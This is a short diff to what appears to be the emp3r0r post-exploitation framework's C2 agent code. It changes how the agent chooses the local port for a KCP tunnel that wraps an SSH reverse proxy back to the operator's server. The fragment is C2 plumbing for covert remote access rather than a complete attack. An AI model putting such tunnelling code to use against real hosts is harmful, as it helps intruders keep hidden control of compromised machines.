@@ -84,11 +84,12 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		ctx, cancel := context.WithCancel(context.Background())
 
 		// start a KCP tunnel to encapsulate the SSH reverse proxy
+		kcp_listen_port := fmt.Sprintf("%d", util.RandInt(10000, 60000))
 		if use_kcp {
 			// kcp will forward to this target address
-			targetAddrWithPort = fmt.Sprintf("127.0.0.1:%s", RuntimeConfig.KCPClientPort)
+			targetAddrWithPort = fmt.Sprintf("127.0.0.1:%s", kcp_listen_port)
 			kcp_server_addr := fmt.Sprintf("%s:%s", *addr, RuntimeConfig.KCPServerPort)
-			go tun.KCPTunClient(kcp_server_addr, RuntimeConfig.KCPClientPort, RuntimeConfig.Password, emp3r0r_data.MagicString)
+			go tun.KCPTunClient(kcp_server_addr, kcp_listen_port, RuntimeConfig.Password, emp3r0r_data.MagicString)
 			util.TakeABlink() // wait for KCP to start
 		}
 		proxyPort, a2iErr := strconv.Atoi(RuntimeConfig.Emp3r0rProxyServerPort)
